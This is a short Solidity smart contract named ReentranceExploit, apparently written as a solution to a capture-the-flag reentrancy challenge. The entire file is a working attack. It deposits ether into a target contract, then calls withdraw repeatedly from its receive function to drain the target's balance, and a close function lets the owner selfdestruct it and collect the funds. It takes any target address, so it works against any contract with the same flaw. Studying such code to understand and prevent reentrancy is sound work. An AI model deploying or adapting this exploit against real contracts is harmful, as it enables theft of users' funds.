// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceExploit {
    address payable owner;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function close() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function exploit(address _target) external payable {
        Reentrance target = Reentrance(_target);
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        Reentrance target = Reentrance(msg.sender);
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}